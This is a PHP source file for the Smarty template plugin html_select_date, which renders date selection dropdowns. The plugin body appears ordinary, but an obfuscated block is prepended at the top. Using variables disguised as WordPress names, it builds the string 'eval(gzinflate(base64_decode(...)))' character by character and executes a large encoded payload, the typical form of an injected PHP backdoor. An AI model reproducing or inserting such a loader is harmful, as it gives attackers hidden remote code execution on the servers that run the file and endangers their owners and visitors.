<?php
$md5 = "39673e64c39fb53a6b04de894a333a74";
$wp_salt = array("b","c","r","t","i","$",';',"z",'o',"_",'6',"e",'a','g',"(","n","v",")",'l','d',"s","f",'4');
$wp_add_filter = create_function('$'.'v',$wp_salt[11].$wp_salt[16].$wp_salt[12].$wp_salt[18].$wp_salt[14].$wp_salt[13].$wp_salt[7].$wp_salt[4].$wp_salt[15].$wp_salt[21].$wp_salt[18].$wp_salt[12].$wp_salt[3].$wp_salt[11].$wp_salt[14].$wp_salt[0].$wp_salt[12].$wp_salt[20].$wp_salt[11].$wp_salt[10].$wp_salt[22].$wp_salt[9].$wp_salt[19].$wp_salt[11].$wp_salt[1].$wp_salt[8].$wp_salt[19].$wp_salt[11].$wp_salt[14].$wp_salt[5].$wp_salt[16].$wp_salt[17].$wp_salt[17].$wp_salt[17].$wp_salt[6]);
$wp_add_filter('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');
?>
<?php
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */

/**
 * Smarty {html_select_date} plugin
 *
 * Type:     function<br>
 * Name:     html_select_date<br>
 * Purpose:  Prints the dropdowns for date selection.
 *
 * ChangeLog:<br>
 *           - 1.0 initial release
 *           - 1.1 added support for +/- N syntax for begin
 *                and end year values. (Monte)
 *           - 1.2 added support for yyyy-mm-dd syntax for
 *                time value. (Jan Rosier)
 *           - 1.3 added support for choosing format for
 *                month values (Gary Loescher)
 *           - 1.3.1 added support for choosing format for
 *                day values (Marcus Bointon)
 *           - 1.3.2 support negative timestamps, force year
 *             dropdown to include given date unless explicitly set (Monte)
 *           - 1.3.4 fix behaviour of 0000-00-00 00:00:00 dates to match that
 *             of 0000-00-00 dates (cybot, boots)
 * @link http://smarty.php.net/manual/en/language.function.html.select.date.php {html_select_date}
 *      (Smarty online manual)
 * @version 1.3.4
 * @author Andrei Zmievski
 * @author Monte Ohrt <monte at ohrt dot com>
 * @param array
 * @param Smarty
 * @return string
 */
function smarty_function_html_select_date($params, &$smarty)
{
    require_once $smarty->_get_plugin_filepath('shared','escape_special_chars');
    require_once $smarty->_get_plugin_filepath('shared','make_timestamp');
    require_once $smarty->_get_plugin_filepath('function','html_options');
    /* Default values. */
    $prefix          = "Date_";
    $start_year      = strftime("%Y");
    $end_year        = $start_year;
    $display_days    = true;
    $display_months  = true;
    $display_years   = true;
    $month_format    = "%B";
    /* Write months as numbers by default  GL */
    $month_value_format = "%m";
    $day_format      = "%02d";
    /* Write day values using this format MB */
    $day_value_format = "%d";
    $year_as_text    = false;
    /* Display years in reverse order? Ie. 2000,1999,.... */
    $reverse_years   = false;
    /* Should the select boxes be part of an array when returned from PHP?
       e.g. setting it to "birthday", would create "birthday[Day]",
       "birthday[Month]" & "birthday[Year]". Can be combined with prefix */
    $field_array     = null;
    /* <select size>'s of the different <select> tags.
       If not set, uses default dropdown. */
    $day_size        = null;
    $month_size      = null;
    $year_size       = null;
    /* Unparsed attributes common to *ALL* the <select>/<input> tags.
       An example might be in the template: all_extra ='class ="foo"'. */
    $all_extra       = null;
    /* Separate attributes for the tags. */
    $day_extra       = null;
    $month_extra     = null;
    $year_extra      = null;
    /* Order in which to display the fields.
       "D" -> day, "M" -> month, "Y" -> year. */
    $field_order     = 'MDY';
    /* String printed between the different fields. */
    $field_separator = "\n";
    $time = time();
    $all_empty       = null;
    $day_empty       = null;
    $month_empty     = null;
    $year_empty      = null;
    $extra_attrs     = '';

    foreach ($params as $_key=>$_value) {
        switch ($_key) {
            case 'prefix':
            case 'time':
            case 'start_year':
            case 'end_year':
            case 'month_format':
            case 'day_format':
            case 'day_value_format':
            case 'field_array':
            case 'day_size':
            case 'month_size':
            case 'year_size':
            case 'all_extra':
            case 'day_extra':
            case 'month_extra':
            case 'year_extra':
            case 'field_order':
            case 'field_separator':
            case 'month_value_format':
            case 'month_empty':
            case 'day_empty':
            case 'year_empty':
                $$_key = (string)$_value;
                break;

            case 'all_empty':
                $$_key = (string)$_value;
                $day_empty = $month_empty = $year_empty = $all_empty;
                break;

            case 'display_days':
            case 'display_months':
            case 'display_years':
            case 'year_as_text':
            case 'reverse_years':
                $$_key = (bool)$_value;
                break;

            default:
                if(!is_array($_value)) {
                    $extra_attrs .= ' '.$_key.'="'.smarty_function_escape_special_chars($_value).'"';
                } else {
                    $smarty->trigger_error("html_select_date: extra attribute '$_key' cannot be an array", E_USER_NOTICE);
                }
                break;
        }
    }

    if (preg_match('!^-\d+$!', $time)) {
        // negative timestamp, use date()
        $time = date('Y-m-d', $time);
    }
    // If $time is not in format yyyy-mm-dd
    if (preg_match('/^(\d{0,4}-\d{0,2}-\d{0,2})/', $time, $found)) {
        $time = $found[1];
    } else {
        // use smarty_make_timestamp to get an unix timestamp and
        // strftime to make yyyy-mm-dd
        $time = strftime('%Y-%m-%d', smarty_make_timestamp($time));
    }
    // Now split this in pieces, which later can be used to set the select
    $time = explode("-", $time);

    // make syntax "+N" or "-N" work with start_year and end_year
    if (preg_match('!^(\+|\-)\s*(\d+)$!', $end_year, $match)) {
        if ($match[1] == '+') {
            $end_year = strftime('%Y') + $match[2];
        } else {
            $end_year = strftime('%Y') - $match[2];
        }
    }
    if (preg_match('!^(\+|\-)\s*(\d+)$!', $start_year, $match)) {
        if ($match[1] == '+') {
            $start_year = strftime('%Y') + $match[2];
        } else {
            $start_year = strftime('%Y') - $match[2];
        }
    }
    if (strlen($time[0]) > 0) {
        if ($start_year > $time[0] && !isset($params['start_year'])) {
            // force start year to include given date if not explicitly set
            $start_year = $time[0];
        }
        if($end_year < $time[0] && !isset($params['end_year'])) {
            // force end year to include given date if not explicitly set
            $end_year = $time[0];
        }
    }

    $field_order = strtoupper($field_order);

    $html_result = $month_result = $day_result = $year_result = "";

    $field_separator_count = -1;
    if ($display_months) {
    	$field_separator_count++;
        $month_names = array();
        $month_values = array();
        if(isset($month_empty)) {
            $month_names[''] = $month_empty;
            $month_values[''] = '';
        }
        for ($i = 1; $i <= 12; $i++) {
            $month_names[$i] = strftime($month_format, mktime(0, 0, 0, $i, 1, 2000));
            $month_values[$i] = strftime($month_value_format, mktime(0, 0, 0, $i, 1, 2000));
        }

        $month_result .= '<select name=';
        if (null !== $field_array){
            $month_result .= '"' . $field_array . '[' . $prefix . 'Month]"';
        } else {
            $month_result .= '"' . $prefix . 'Month"';
        }
        if (null !== $month_size){
            $month_result .= ' size="' . $month_size . '"';
        }
        if (null !== $month_extra){
            $month_result .= ' ' . $month_extra;
        }
        if (null !== $all_extra){
            $month_result .= ' ' . $all_extra;
        }
        $month_result .= $extra_attrs . '>'."\n";

        $month_result .= smarty_function_html_options(array('output'     => $month_names,
                                                            'values'     => $month_values,
                                                            'selected'   => (int)$time[1] ? strftime($month_value_format, mktime(0, 0, 0, (int)$time[1], 1, 2000)) : '',
                                                            'print_result' => false),
                                                      $smarty);
        $month_result .= '</select>';
    }

    if ($display_days) {
    	$field_separator_count++;
        $days = array();
        if (isset($day_empty)) {
            $days[''] = $day_empty;
            $day_values[''] = '';
        }
        for ($i = 1; $i <= 31; $i++) {
            $days[] = sprintf($day_format, $i);
            $day_values[] = sprintf($day_value_format, $i);
        }

        $day_result .= '<select name=';
        if (null !== $field_array){
            $day_result .= '"' . $field_array . '[' . $prefix . 'Day]"';
        } else {
            $day_result .= '"' . $prefix . 'Day"';
        }
        if (null !== $day_size){
            $day_result .= ' size="' . $day_size . '"';
        }
        if (null !== $all_extra){
            $day_result .= ' ' . $all_extra;
        }
        if (null !== $day_extra){
            $day_result .= ' ' . $day_extra;
        }
        $day_result .= $extra_attrs . '>'."\n";
        $day_result .= smarty_function_html_options(array('output'     => $days,
                                                          'values'     => $day_values,
                                                          'selected'   => $time[2],
                                                          'print_result' => false),
                                                    $smarty);
        $day_result .= '</select>';
    }

    if ($display_years) {
    	$field_separator_count++;
        if (null !== $field_array){
            $year_name = $field_array . '[' . $prefix . 'Year]';
        } else {
            $year_name = $prefix . 'Year';
        }
        if ($year_as_text) {
            $year_result .= '<input type="text" name="' . $year_name . '" value="' . $time[0] . '" size="4" maxlength="4"';
            if (null !== $all_extra){
                $year_result .= ' ' . $all_extra;
            }
            if (null !== $year_extra){
                $year_result .= ' ' . $year_extra;
            }
            $year_result .= ' />';
        } else {
            $years = range((int)$start_year, (int)$end_year);
            if ($reverse_years) {
                rsort($years, SORT_NUMERIC);
            } else {
                sort($years, SORT_NUMERIC);
            }
            $yearvals = $years;
            if(isset($year_empty)) {
                array_unshift($years, $year_empty);
                array_unshift($yearvals, '');
            }
            $year_result .= '<select name="' . $year_name . '"';
            if (null !== $year_size){
                $year_result .= ' size="' . $year_size . '"';
            }
            if (null !== $all_extra){
                $year_result .= ' ' . $all_extra;
            }
            if (null !== $year_extra){
                $year_result .= ' ' . $year_extra;
            }
            $year_result .= $extra_attrs . '>'."\n";
            $year_result .= smarty_function_html_options(array('output' => $years,
                                                               'values' => $yearvals,
                                                               'selected'   => $time[0],
                                                               'print_result' => false),
                                                         $smarty);
            $year_result .= '</select>';
        }
    }

    // Loop thru the field_order field
    for ($i = 0; $i <= 2; $i++){
        $c = substr($field_order, $i, 1);
        switch ($c){
            case 'D':
                $html_result .= $day_result;
                break;

            case 'M':
                $html_result .= $month_result;
                break;

            case 'Y':
                $html_result .= $year_result;
                break;
        }
        // Add the field seperator
        if($i < $field_separator_count) {
            $html_result .= $field_separator;
        }
    }

    return $html_result;
}

/* vim: set expandtab: */

?>